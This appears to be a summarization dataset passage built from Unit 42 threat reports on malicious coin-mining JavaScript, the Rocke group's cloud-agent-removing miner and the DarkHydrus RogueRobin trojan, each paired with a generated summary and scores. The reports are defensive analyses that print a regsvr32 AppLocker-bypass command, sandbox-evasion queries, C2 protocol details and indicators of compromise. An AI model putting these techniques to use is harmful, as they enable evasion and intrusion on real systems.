usually just drop an iframe on the page, do not usually use global variables. Palo Alto Networks implements other techniques to detect such malicious scripts. For example, we analyze all sub-requests originating from the page during crawling, including requests from injected malicious iframes and scripts. As for exploit kits - we inspect OS-level behavior of the exploit kits within a high-interaction Windows/IE environment.Malicious Domain AnalysisOverall, we discovered 8,712 coin mining URLs which resolve to 7,654 distinct domains. In addition to coin mining, we detected 4,633 URLs with other malicious scripts which resolve to 2,666 domains. We looked up both sets of domains in our passive DNS (pDNS) database, which gave us the ability to estimate both their life span and popularity. Figure 7 is a scatter plot showing how many days each domain was active and how many times it was resolved (or in other words, how popular is the domain).Figure 7. Life span vs. popularity of malicious URLsBased on Figure 7 we can infer that coin mining domains are significantly more popular and longer-living, whereas other malicious domains usually live less than 100 days and receive less than 10,000 DNS resolutions (lower cluster of blue dots). This is not surprising as scam and phishing campaigns eventually get discovered and blocked, and thus have to rotate their domains. Contrastingly, coin miners usually fall into a grey zone, being malicious enough that users want to block the mining, while not always being enough reason to permanently block a domain or shutdown a server. Even many reputable websites deliberately incorporate coin miners, forcing their visitors to agree with that in exchange for 'free' content access.As we see on Figure 7, some domains are extremely prevalent, receiving more than tens of millions DNS resolutions and living for more than 4 years. These examples include domains directly related to mining (such as, ""coinhive[.]com"" and ""moonbit[.]co[.]in""), as well as various websites with high-demand content (such as, ""xxgasm[.]com"", ""seriesfree[.]to"", ""rumorfix[.]com"", and ""gooddrama[.]net""). Interestingly, on the scatter plot we also see domains with many DNS requests, but with a shorter life cycle. We suspect that those are cases when an illegitimate website is registered and becomes very popular. For example, ""indoxxi[.]cool"" offering online movies lived for only 14 days, but already has 63,694 resolutions in pDNS records.Examples of non-mining malicious JavaScripts are usually hosted on specially-crafted domains, such as, ""win32-0x2ndt-firewall-error[.]gq"" (technical support scam), ""www2[.]betterdealupgradeaflash[.]icu"" (fake Flash update), or ""paypal-verificationupdate[.]obay[.]me"" (phishing). Or in general, on less popular websites. One may notice that on Figure 7 there are also rare cases of highly popular and long-living scam domains. For example, these are domains of URL shorteners (e.g., ""ow[.]ly"" and ""smarturl[.]it""), domains serving ads and frequently used by scam campaigns (e.g., ""blank[.]com"" and ""elitedollars[.]com""). Similarly, popular but illegitimate websites (e.g., ""mytorrents[.]org"" and ""yourmovie[.]org"") also exist over longer period of time.After analyzing Alexa rankings for TLD+1 domains (e.g. xyz.com instead of abc.xyz.com) of the detected coin mining domains, we were surprised to find that the majority of them, namely 66.9%, were in Alexa's top million at least for one day during that month. Moreover, 1,295 coin mining domains remained in the top million, including 37 domains in the first 10,000. On one hand, these results suggest that when reputable websites begin to adopt mining, they are likely to drop out from the top popular websites. On the other hand, we are still alarmed by the high number of unauthorized coin miners among the Alexa's top million websites. Figure 8 shows the distribution of 1,295 coin mining domains we detected across Alexa's rank ranges, and we clearly see that unauthorized miners dominate even in the top 100,000.In contrast, only 71 from non-mining malicious JavaScript domains were found in Alexa's top million, including 7 in the top 10,000. One of the most popular examples for both mining and non-mining categories of malicious JavaScripts were websites hosted on ""blogspot[.]com"", since each subdomain consists of a completely different website.Figure 8. Rank distribution of coin mining domains in Alexa's Top MillionTable 1 lists the most popular TLDs, which serve coin miners and other malicious scripts. As we see, the [.]icu TLD was abused the most in November to distribute different kinds of scams. Regarding coin mining domains, most of them reside on the more reputable [.]com TLD, which matches our previous finding that miners are often times present on more popular and long living websites (such as blogs, video downloads, and torrents).Coin miners Malicious JS TLD  Domain TLD  Domain com 3487 icu 1299 ir 394 com 409 net 337 club 290 ru 319 xyz 83 org 285 tk 61 br 206 cf 49 tk 111 net 32 info 108 ga 27 de 91 ml 23 in 91 online 22Table 1. Top 10 TLDs Serving coin miners and malicious JavaScriptIn order to understand the geography of malicious websites, we translated their IP addresses into locations. Figure 8 shows the country-level distribution of the IPs for coin miners, while Figure 9 illustrates the map for other malicious JavaScript. One may notice that coin mining websites cover more countries, though both maps show the majority of servers are located in US.Figure 8. Country-level distribution of coin mining IPsFigure 9. Country-level distribution of IPs serving non-mining Malicious JSCustomer ImpactDuring one month, our customers attempted to visit 6,804 coin mining URLs out of the 8,712 described above. Overall, we registered more than 1.1 million requests towards these websites from more than 30,000 devices. Similarly, our telemetry data reveals that 4,476 scam URLs (out of 4,633) were requested by our customers more than 243,000 times from 12,000 unique devices around the globe.Such extensive impact on real web users puts malicious JavaScript campaigns as one of the most common threats on the modern web. Therefore, light-weight dynamic methods to detect obfuscated malicious code, which can be run on a large scale, are extremely important for proactive protection.ConclusionBehavioral analysis of JavaScript is important ammunition against modern threats, such as unauthorized coin miners and numerous scam campaigns. Such behavioral signatures as global variable, alert texts, and WebSocket messages, while helpful, are not the only dynamic information that helps in detecting malicious scripts. At Palo Alto Networks, we set ourselves to continue improving the detection methods of online threats and protecting our customers.Intrusive coin miners continue to be one of the main threats on the Web, but only a few mining libraries are trending based on the past month. In addition to the most well-known Coinhive library, only JSE-Coin, Crypto-Loot and CoinImp are noticeably present. Coin mining domains are significantly longer living and more popular in comparison to scam campaigns, which makes accurately blocking them crucial for our customers' protection. With behavioral analysis we can separate unauthorized coin mining, and detect not only the inclusion of mining libraries but also the mining process by itself.Technical support scams and fake Flash update scams are the next most prevalent types of malicious JavaScript after coin miners. It is very important to discover and block these websites before any user visits them.As of now, we continue to scan the web on a daily basis, enriching our database of malicious websites. As a result, Palo Alto Networks customers are protected from websites hosting malicious JavaScripts via PAN-DB URL Filtering and DNS signatures as part of the Threat Prevention subscription.Indicators of CompromiseIn the files below, we list all the URLs that lead to coin miners and scam JavaScript, which were released to PANDB based on the results described above (note, some of those URLs are malicious gateways that may lead to different landing pages).coin_mining_urlsscam_js_urls";"The ITSecurity report found 8,712 coin mining URLs which resolve to 7,654 distinct domains. Additionally, 4,633 malicious scripts were detected which resolve to 2,666 domains. Based on Figure 7, coin mining domains are significantly more popular and longerliving, whereas other malicious domains usually live less than 100 days and receive less than 10,000 DNS resolutions (lower cluster of blue dots). This is not surprising as scam and phishing campaigns eventually get discovered and blocked, and thus have to rotate their domains. Contrastingly, coin miners usually fall into a grey zone, being malicious enough that users want to block the mining, while not always being enough reason to permanently block a domain or shutdown a server. Even many reputable websites deliberately incorporate coin miners, forcing their visitors to agree with that in exchange for 'free' content access. As we see on Figure 7, some domains are extremely prevalent, receiving more than tens of millions DNS resolutions and living for more than 4 years. These examples include domains directly related to mining (such as, ""coinhive[. ]com"" and ""moonbit[.]co[.";en;{'r': 0.11296296296296296, 'p': 0.9606299212598425, 'f': 0.20215409919408256};{'r': 0.06332781456953643, 'p': 0.9161676646706587, 'f': 0.11846689774523529};{'r': 0.11296296296296296, 'p': 0.9606299212598425, 'f': 0.20215409919408256}
https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/;Malware Used by Rocke Group Evolves to Evade Detection by Cloud Security Products;"This post is also available in: ??? (Japanese)Palo Alto Networks Unit 42 recently captured and investigated new samples of the Linux coin mining malware used by the Rocke group. The family was suspected to be developed by the Iron cybercrime group and it's also associated with the Xbash malware we reported on in September of 2018. The threat actor Rocke was originally revealed by Talos in August of 2018 and many remarkable behaviors were disclosed in their blog post. The samples described in this report were collected in October of 2018, and since that time the command and control servers they use have been shut down.During our analysis, we realized that these samples used by the Rocke group adopted new code to uninstall five different cloud security protection and monitoring products from compromised Linux servers. In our analysis, these attacks did not compromise these security products: rather, the attacks first gained full administrative control over the hosts and then abused that full administrative control to uninstall these products in the same way a legitimate administrator would.These products were developed by Tencent Cloud and Alibaba Cloud (Aliyun), the two leading cloud providers in China that are expanding their business globally. To the best of our knowledge, this is the first malware family that developed the unique capability to target and remove cloud security products. This also highlights a new challenge for products in the Cloud Workload Protection Platforms market defined by Gartner.Technical DetailsThe Coin Miner used by Rocke GroupThe threat actor Rocke was first reported by Cisco Talos in late July 2018. The ultimate goal of this threat is to mine Monero cryptocurrency in compromised Linux machines.To deliver the malware to the victim machines, the Rocke group exploits vulnerabilities in Apache Struts 2, Oracle WebLogic, and Adobe ColdFusion. For example, by exploiting Oracle WebLogic vulnerability CVE-2017-10271 in Linux shown in Figure 1, a compromised Linux victim machine downloads backdoor 0720.bin and opens a shell.Figure 1. Exploit CVE-2017-10271Once the C2 connection is established, malware used by the Rocke group downloads shell script named as ""a7"" to the victim machine. The behaviors of a7 include:Achieve persistence through cronjobsKill other crypto mining processesAdd iptables rules to block other crypto mining malwareUninstall agent-based cloud security productsDownload and run UPX packed coin miner from blog[.]sydwzl[.]cnHide process from Linux ps command by using the open source tool ""libprocesshider"" with LD_PRELOAD trickAdjust malicious file date timeCloud Workload Protection PlatformsAccording to Gartner, Cloud Workload Protection Platforms (CWPPs) are the agent-based workload-centric security protection solutions. To mitigate the impact of malware intrusion in public cloud infrastructure, cloud service providers develop their own CWPPs as the server security operation and management products.For example, Tencent Cloud offers Tencent Host Security (HS, aka YunJing??) with various security protection services. According to its ""Product Overview"" document, Tencent Host Security provides key security features like trojan detection and removal based on machine learning, password cracking alert, logging activity audit, vulnerability management, and asset management as shown in Figure 2.Figure 2. Tencent Host Security Key FeaturesAlibaba Cloud (Aliyun) also offers a cloud security product called Threat Detection Service (TDS, aka Aegis ???). Alibaba Cloud Threat Detection Service provides security services like malware scanning and removal, vulnerability management, log analysis, and threat analysis based on big data.Third-party cybersecurity companies also provide CWPPs. For instance, Trend Micro, Symantec, and Microsoft have their own cloud security products for public cloud infrastructure. As with all security products, adversaries inevitably work to evade these systems to be able to achieve their ultimate goals.Evading Detection from Cloud Workload Protection PlatformsIn response to agent-based Cloud Workload Protection Platforms from cloud service providers, malware used by the Rocke group gradually developed the capability to evade detection before exhibiting any malicious behaviors. To be more specific, the malware uninstalls cloud security products by Alibaba Cloud and Tencent Cloud.In the early version of the malware used by Rocke, it only attempts to kill Tencent Cloud Monitor process as shown in Figure 3.Figure 3. Malware kills Tencent Cloud Monitor processRealizing that killing the cloud monitor service alone is not enough to evade detection by agent-based cloud security products, the malware authors continued developing more effective methods to evade detection by killing more agent-based cloud security services.The Tencent Cloud and Alibaba Cloud official websites provide documents to guide users about how to uninstall their cloud security products. The document for uninstalling Alibaba Threat Detection Service is shown in Figure 4.Figure 4. Official guide for uninstalling Alibaba Threat Detection ServiceThe document for uninstalling Tencent Cloud Host Security is shown in Figure 5.Figure 5. Official guide for uninstalling Tencent Cloud Host Security ProductThe malware used by the Rocke group follows the uninstallation procedure provided by Alibaba Cloud and Tencent Cloud as well as some random blog posts on the Internet. The key uninstall function is shown in Figure 6.Figure 6. Key function for malware to evade detectionThis function can uninstall:Alibaba Threat Detection Service agent. Alibaba CloudMonitor agent (Monitor CPU & memory consumption, network connectivity). Alibaba Cloud Assistant agent (tool for automatically managing instances). Tencent Host Security agent. Tencent Cloud Monitor agent.After agent-based cloud security and monitor products are uninstalled, the malware used by the Rocke group begins to exhibit malicious behaviors. We believe this unique evasion behavior will be the new trend for malware which targets public cloud infrastructure.MitigationsPalo Alto Networks Unit 42 has been cooperating with Tencent Cloud and Alibaba Cloud to address the malware evasion problem and its C2 infrastructure. Additionally, the malicious C2 domains are identified by our PAN-DB URL Filtering.ConclusionPublic cloud infrastructure is one of the main targets for this cybercrime group. Realizing the existing cloud monitor and security products may detect the possible malware intrusion, malware authors continue to create new evasion technologies to avoid being detected by cloud security product.The variant of the malware used by the Rocke group is an example that demonstrates that the agent-based cloud security solution may not be enough to prevent evasive malware targeted at public cloud infrastructure.Indicators of CompromiseSamples with the evasion behavior2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c42f603054dda69c2ac1e49c916ea4a4b1ae6961ec3c01d65f16929d445a56435528ea5d2e44538cd7fec11a28cce7c86fe208b2e8f53d57bf8a18957adb90c5ab232c771f38da79d5b8f7c6c57ddb4f7a8d6d44f8bca41be4407ed4923096c700893bdc6b7d2d7134b1ceb5445dbb97ad9c731a427490d59f6858a835525d84179300f1aa56a73887d05672bfb9862bd786230142c949732c208e5e019d14f83a27611b92d31289d023d962d3eb7c6abd194dbdbbe4e6977c42d94883553841e8d341e3a9133e534ca35d5ccc54b8a79f93ff0c917790e7d5f73fedaa480a6b93ed038e9ea922af9f0bf5e8be42b394650fa808982d5d555e6c50c715ff2cca0c4b74c4d66387c70658238ac5ab392e2fe5557f98fe09eadda9259ada0d87c0f1e391963f496ba056e9a9f750cbd28ca7a08ac4cfc434bee4fc57a292b11941e6017dee32e287f37a82cf6e249f8a85b5c9d4f090e5452118ccacaf147e88dc66Domains for C2 Communicationdwn[.]rundll32[.]mlwww[.]aybc[.]soa[.]ssvs[.]spacesydwzl[.]cnIPs for C2 Communication118.24.150[.]172 (on Tencent Cloud)120.55.54[.]65 (on Alibaba Cloud)URLs for Code Updatehxxps://pastebin[.]com/raw/CnPtQ2tMhxxps://pastebin[.]com/raw/rjPGgXQEhxxps://pastebin[.]com/raw/1NtRkBc3hxxps://pastebin[.]com/raw/tRxfvbYNhxxps://pastebin[.]com/raw/SSCy7mY7hxxps://pastebin[.]com/raw/VVt27LeHhxxps://pastebin[.]com/raw/Fj2YdETvhxxps://pastebin[.]com/raw/JNPewK6rhxxps://pastebin[.]com/raw/TzBeq3AMhxxps://pastebin[.]com/raw/eRkrSQfEhxxps://pastebin[.]com/raw/5bjpjvLPhxxps://pastebin[.]com/raw/Gw7mywhCXMR Wallet Address42im1KxfTw2Sxa716eKkQAcJpS6cwqkGaHHGnnUAcdDhG2NJhqEF1nNRwjkBsYDJQtDkLCTPehfDC4zjMy5hefT81Xk2h7V.v7";"The ITSecurity report describes a malware family used by the Rocke group to uninstall five different cloud security protection and monitoring products from compromised Linux servers. The threat actor Rocke was first reported by Cisco Talos in late July 2018. The ultimate goal of this threat is to mine Monero cryptocurrency in compromised Linux machines. To deliver the malware to the victim machines, the Rocke group exploits vulnerabilities in Apache Struts 2, Oracle WebLogic, and Adobe ColdFusion. For example, by exploiting Oracle WebLogic vulnerability CVE201710271 in Linux shown in Figure 1, a compromised Linux victim machine downloads backdoor 0720.bin and opens a shell. Figure 1. Exploit CVE201710271 Once the C2 connection is established, malware used by the Rocke group downloads shell script named as ""a7"" to the victim machine. The behaviors of a7 include: Achieve persistence through cronjobs Kill other crypto mining processes Add iptables rules to block other crypto mining malware Uninstall agentbased cloud security products Download and run UPX packed coin miner from blog[.]sydwzl[. ]cnHide process from Linux ps command by using the open source tool ""libprocesshider"" with LD_PRELOAD trick Adjust malicious file date time Cloud Workload Protection PlatformsAccording to Gartner, Cloud Workload Protection Platforms (CWPPs) are the agentbased workloadcentric security protection solutions. To mitigate the impact of malware intrusion in public cloud infrastructure, cloud service providers develop their own CWPPs as the server security operation and management products. For example";en;{'r': 0.28781512605042014, 'p': 0.8954248366013072, 'f': 0.43561207898938686};{'r': 0.21071012805587894, 'p': 0.8341013824884793, 'f': 0.3364312235457809};{'r': 0.28781512605042014, 'p': 0.8954248366013072, 'f': 0.43561207898938686}
https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/;DarkHydrus delivers new Trojan that can use Google Drive for C2 communications;"This post is also available in: ??? (Japanese)In the summer of 2018, Unit 42 released reporting regarding activity in the Middle East surrounding a cluster of activity using similar tactics, tools, and procedures (TTPs) in which we named the adversary group DarkHydrus. This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques.Since that initial reporting, we had not observed new activity from DarkHydrus until recently, when 360TIC published a tweet and subsequent research discussing delivery documents that appeared to be attributed to DarkHydrus. In the process of analyzing the delivery documents, we were able to collect additional associated samples, uncover additional functionality of the payloads including the use of Google Drive API, and confirm the strong likelihood of attribution to DarkHydrus. We have notified Google of our findings.Delivery DocumentWe collected a total of three DarkHydrus delivery documents installing a new variant of the RogueRobin trojan. These three documents were extremely similar to each other and are all macro enabled Excel documents with .xlsm file extensions. None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1. While we cannot confirm the delivery mechanism, it is likely that the instructions to click the Enable Content button were provided during delivery, such as in the body of a spear-phishing email.Figure 1 DarkHydrus' delivery document does not have a lure image or messageWithout the delivery mechanism we cannot confirm the exact time these delivery documents were used in an attack, however, the observed timestamps within these three delivery documents gives us an idea when the DarkHydrus actors created them. While the creation times were timestomped to a default time of 2006-09-16 00:00:00Z commonly observed in malicious documents, the Last Modified times were still available and suggest that DarkHydrus created these documents in December 2018 and January 2019. Table 1 shows the breakdown of timestamps and their associated sample hashes.SHA256 Last Modified e068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022 2018-12-15T05:14:32Z 4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8 2018-12-23T05:45:43Z 513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8 2019-01-08T06:51:21ZTable 1 Timestamps of delivery documentsThe macro executes immediately after pressing the Enable Content button thanks to the Workbook_Open sub-function, which will call the actor created New_Macro function. The New_Macro function starts by concatenating several strings to create a PowerShell script that it will write to the file %TEMP%\WINDOWSTEMP.ps1. The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\12-B-366.txt. While .sct files are used by a multitude of applications, in this instance it is being used as a Windows Script Component file. The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:regsvr32.exe /s /n /u /i:%TEMP%\12-B-366.txt scrobj.dll 1 regsvr32 . exe / s / n / u / i : % TEMP % \ 12 - B - 366.txt scrobj . dllThe use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module. The WINDOWSTEMP.ps1 script is a dropper that decodes an embedded executable using base64 and decompresses it with the System.IO.Compression.GzipStream object. The script saves the decoded and decompressed executable to %APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up. The WindowsTemplate.exe executable is a new variant of RogueRobin written in C.RogueRobin .NET PayloadIn our original blog on DarkHydrus, we analyzed a PowerShell-based payload we named RogueRobin. While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C payload was functionally similar to the original RogueRobin payload. The similarities between the PowerShell and C variants of RogueRobin suggests that the DarkHydrus group ported their code to a compiled variant.The C variant of RogueRobin attempts to detect if it is executing in a sandbox environment using the same commands as in the PowerShell variant of RogueRobin. The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system. The Trojan also checks to see if a debugger is attached to its processes and will exit if it detects the presence of a debugger.PowerShell command Description 'gwmi -query ""select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VBOX%'"" Query attempts to detect VirtualBox environment from the win32_BIOS WMI class gwmi -query ""select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%bochs%'"" Query attempts to detect Bochs environment from the win32_BIOS WMI class gwmi -query ""select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%qemu%'"" Query attempts to detect QEMU environment from the win32_BIOS WMI class gwmi -query ""select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VirtualBox%'"" Query attempts to detect VirtualBox environment from the win32_BIOS WMI class gwmi -query ""select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VM%'"" Query attempts to detect VMWare environment from the win32_BIOS WMI class gwmi -query ""Select * from win32_BIOS where Manufacturer LIKE '%XEN%'"" Query attempts to detect Xen environment from the win32_BIOS WMI class gwmi win32_computersystem Uses this query to check the system information for the string ""VMware"". gwmi -query ""Select TotalPhysicalMemory from Win32_ComputerSystem"" Uses this query to check to see if the total physical memory is less than 2,900,000,000 bytes. gwmi -Class win32_Processor | select NumberOfCores Uses this query to check to see if the total number of CPU cores is less than 1. Get-Process | select Company Checks to see if any running processes have ""Wireshark"" or ""Sysinternals"" as the company name.Table 2 Sandbox evasion checks in the C variant of RogueRobinLike the original version, the C variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types. Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query, if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co. The domain is legitimate and owned by Google. The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck. This DNS query likely exists as a note to researchers or possibly as an anti-analysis measure, as it will only trigger if the researcher has already patched the initial debugger check to move onto the C2 function. Figure 2 shows the code responsible for detecting the attached debugger and issuing the corresponding DNS request.Figure 2 Code that issues DNS query to gogle.co if a debugger is detectedAll DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response. Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com 1 216.58.192.174 | 2a00 : 1450 : 4001 : 81a :: 200e | 2200 :: | download . microsoft . com | ntservicepack . microsoft . com | windowsupdate . microsoft . com | update . microsoft . comAdditionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from.Regular Expressions ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>) Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8}) Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8}) ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>) (\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>) Address:\\s+(\\d+.\\d+.\\d+.\\d+)Table 3 Regular expressions used by RogueRobinThe C variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers. Figure 3 shows the RogueRobin payload issuing DNS requests to resolve custom crafted subdomains of its C2 domains using TXT, SOA, MX, CNAME, SRV, A and AAAA query types.Figure 3 RogueRobin testing various DNS query typesThe domains in the test queries, such as aqhpc.akdns[.]live have subdomains that are generated by substituting the digits in the Trojan's process ID with characters seen in Table 4 (for example qhp for the PID 908) and surrounding these characters with the static characters a and c. The C2 server can respond to any of the query types to provide a unique identifier value that the Trojan will store in a variable and use in future DNS requests.Character Digit h 0 i 1 j 2 k 3 l 4 m 5 n 6 o 7 p 8 q 9Table 4 Character substitution used in RogueRobinThe Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands. To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server:c<unique identifier><job identifier padded with '0' to make three digits><sequence number>cThe generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters. The Trojan checks the response to this query using the regular expressions in Table 3. If it received a non-cancelling response, the Trojan will extract data from the DNS responses and treat it as commands. Table 5 shows the commands that the C variant of RogueRobin can handle, which is extremely similar to the previously analyzed PowerShell variant.Regex Description ^kill Kills a thread running in Trojan based on a provided thread name ^\$fileDownload Uploads a file to the C2 server via the DNS tunnel ^\$importModule Runs a provided PowerShell command and adds it to a list called 'modules' ^\$x_mode Turns on the alternative mode of 'x_mode' on to use the alternative C2 channel. If preceded by ""OFF"", it turns 'x_mode' off, otherwise the command is newline delimited with settings to use this alternative C2 functionality. ^\$ClearModules Clears the previously run 'modules' list ^\$fileUpload This command should be followed by a string that will be used as a path to save a new file to the system. This command will then reach out to the C2 server to obtain the data to save to this file path. ^testmode Runs the test function to determine which DNS query types can successfully communicate with the C2 ^showconfig Creates a pipe delimited (""|"") string that contains the sample's settings, including the list of C2 domains and available DNS query types. ^changeConfig Allows the C2 to set values within the Trojan's configuration via pipe delimited (""|"") string. The string is formatted as ""<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>"" ^slp Sets the sleep and jitter values ^exit Exits the TrojanTable 5 Commands available within the C variant of RogueRobinUsing Google Drive for C2A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C variant is the x_mode. This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API. The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests.In x_mode, RogueRobin uploads a file to the Google Drive account and continually checks the file's modification time to see if the actor has made any changes to it. The actor will first modify the file to include a unique identifier that the Trojan will use for future communications. The Trojan will treat all subsequent changes to the file made by the actor as jobs and will treat them as commands, which it will handle with the same command handler seen in Table 5.To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account. Figure 4 shows the code in RogueRobin that handles the x_mode command, specifically splitting the command data on newlines and using the resulting array to set variables used as x_mode settings.Figure 4 x_mode command and new line delimited settingsAs seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive.Variable Name Description gdu Google Drive URL for downloading files to the Google Drive account gduu Google Drive URL for uploading files to the Google Drive account gdue Google Drive URL for updating a file on the Google Drive account gdo2t Google Drive URL used to get the OAUTH access_token client_id The client_id for the OAUTH application cs The client_secret for OAUTH r_t The refresh_token for OAUTHTable 6 Variables used to store settings needed to use Google Drive as a C2To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data. As seen in Figure 5, the values for these fields are set to variables initially set upon issuing of the x_mode command.Figure 5 HTTP POST request to obtain an OAUTH access tokenFigure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response:\""access_token\"":(.*)Once authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account. To upload a file, the Trojan first creates an HTTP POST request to the URL stored in gduu to send the following JSON data to the Google Drive account:{ ""name"" : ""<process ID of Trojan>.txt"" }Google Drive will respond to this request with an HTTP response whose header contains a Location field. This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4. The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value:\""id\"":(.*)The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file. The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows:<Google Drive URL in 'gdu'> + <file identifier> + ""?supportTeamDrives=true&fields=modifiedTime""The Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time:\""modifiedTime\"":(.*)The Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded. The Trojan will write <process ID of Trojan> to a second file stored on the Google Drive instance named <process ID of Trojan>-U.txt. In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows:<Google Drive URL in 'gdue'> + <second file identifier> + ""?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents""In one RogueRobin sample (SHA256: f1b2bc0831...), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a hardcoded Google Drive URL, as seen in Figure 6. This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing.Figure 6 Hardcoded Google Drive URL used in RogueRobin sampleWhen the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive. The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows:<Google Drive URL in 'gdu'> + <first file identifier> + ""?alt=media""With the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file. The Trojan processes the downloaded data the same way it would for a unique identifier as if the data was obtained via the DNS tunneling protocol using the TXT query mode, specifically by searching the data using the following regular expression:\""(\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>).\""With the unique identifier value obtained from the file on Google Drive, the Trojan will attempt to obtain jobs using the Google Drive communications channel. To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4:c<unique identifier><job identifier padded with '0' to make three digits><sequence number>c.<C2 domain>The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier. The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt. After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file. When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows:<Google Drive URL in 'gdu'> + <file identifier in 'f_id'> + ""?alt=media""The Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression:([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)The Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected. It will use the data after the separator as the string that it will subject to the command handler seen in Table 5.InfrastructureThe initial list of C2 domains released by 360TIC associated with 513813af15... appeared thematically very similar to previous DarkHydrus activity, using domain names visually similar to well-known technology vendors or service providers. This list was further expanded upon by ClearSky Security (here, here and here) in a series of tweets that provided additional similar domain names also likely linked to DarkHydrus. To better understand how these domains are related to DarkHydrus, we began visually mapping the relationships between the list of domains, which can be seen in Figure 7. The diagram shows the DarkHydrus group using a 